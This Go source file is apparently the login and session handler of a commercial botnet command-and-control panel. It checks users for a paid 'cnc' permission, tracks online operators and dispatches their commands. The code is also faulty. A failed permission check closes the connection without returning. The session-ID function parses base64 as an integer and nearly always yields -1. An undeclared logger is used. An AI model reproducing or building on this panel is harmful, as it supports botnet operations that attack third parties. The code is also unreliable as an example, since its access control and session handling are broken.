package net

import (
	"api/core/database"
	"api/core/models"
	"api/core/net/commands"
	"api/core/net/sessions"
	"api/core/net/term"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

var SpinnerChars = []string{"|", "/", "-", "\\"}

func RemoveSession(id int64) bool {
	sessions.SessionMutex.Lock()
	delete(sessions.Sessions, id)
	sessions.SessionMutex.Unlock()
	return true
}

func handler(conn net.Conn) {
	defer conn.Close()
	conn.Write([]byte(fmt.Sprintf("\033]0;%s - Login\007", models.Config.Name)))
	// Consume 64 bytes
	buf := make([]byte, 64)
	if _, err := conn.Read(buf); err != nil {
		logger.Println("Failed to read initial data: ", err)
		return
	}
	tm := term.New(conn)

	fmt.Fprintf(conn, "Username# ")
	username, err := tm.ReadLine("Username# ")
	if err != nil {
		return
	}
	fmt.Fprintf(conn, "Password# ")
	pass, err := tm.ReadPassword("Password# ")
	if err != nil {
		return
	}

	user, err := database.Container.GetUser(username)
	if err != nil {
		fmt.Fprintf(conn, "Database error: %v\r\n", err)
		time.Sleep(5 * time.Second)
		conn.Close()
		return
	}

	if !user.HasPermission("cnc") && !user.HasPermission("admin") {
		fmt.Fprintf(conn, "Must buy CnC!\r\n")
		time.Sleep(5 * time.Second)
		conn.Close()
	}
	
	if !user.IsKey([]byte(pass)) {
		fmt.Fprintf(conn, "Invalid password...\r\n")
		time.Sleep(5 * time.Second)
		conn.Close()
		return
	}

	var Session = &sessions.Session{
		User: user,
		Conn: conn,
	}

	Session.CreateCookie()

	for _, session := range sessions.Sessions {
		if session.User.Username == username {
			fmt.Fprintf(conn, "Session Already Open!")
			logger.Println(session.User.Username + " already has a session open!")
			return
		}
	}

	sessions.SessionMutex.Lock()
	sessions.Sessions[Session.ID] = Session
	sessions.SessionMutex.Unlock()
	var role string
	if Session.User.HasPermission("admin") {
		role = "admin"
	} else {
		role = "user"
	}
	go func() {
		i := 0 // Initialize the counter for spinner animation
		
		for {
			time.Sleep(time.Second)
			
			// Construct the message with the spinner character that changes over time
			message := fmt.Sprintf("\033]0; [%s] %s CnC - Username [%s] - Online [%d] - Rank [%s] [%s] \007",
			SpinnerChars[i%len(SpinnerChars)], models.Config.Name, Session.User.Username, sessions.Count(), role, SpinnerChars[i%len(SpinnerChars)])
			
			// Write the message to the connection
			if _, err := conn.Write([]byte(message)); err != nil {
				if RemoveSession(Session.ID) {
					logger.Println(Session.User.Username + " Session Closed!")
				}
				conn.Close()
				break
			}
			
			i++ // Increment the counter for next spinner character
		}
	}()
	commands.Commands["splash-home"].Exec(Session, nil)
	for {
		tm.Write([]byte(fmt.Sprintf("%s@%s# ", Session.User.Username, models.Config.Name)))
		cmd, err := tm.ReadLine(fmt.Sprintf("%s@%s# ", Session.User.Username, models.Config.Name))
		if err != nil {
			return
		}
		cmdlist := strings.Split(cmd, " ")
		if !commands.IsCommand(cmdlist[0]) {
			fmt.Fprintf(conn, "Command (%s) is Invalid\r\n", cmdlist[0])
		} else {
			commands.Commands[cmdlist[0]].Exec(Session, cmdlist)
		}
	}
}

func GenerateSessionID() int64 {
	// Generate a random session ID string
	sessionIDBytes := make([]byte, 16) // 16 bytes = 128 bits
	_, err := rand.Read(sessionIDBytes)
	if err != nil {
		// Handle error
		return -1 // Return an error value
	}

	// Encode the random bytes to base64
	sessionIDBase64 := base64.URLEncoding.EncodeToString(sessionIDBytes)

	// Convert the base64 string to an integer
	sessionIDInt, err := strconv.ParseInt(sessionIDBase64, 10, 64)
	if err != nil {
		// Handle error
		return -1 // Return an error value
	}

	return sessionIDInt
}
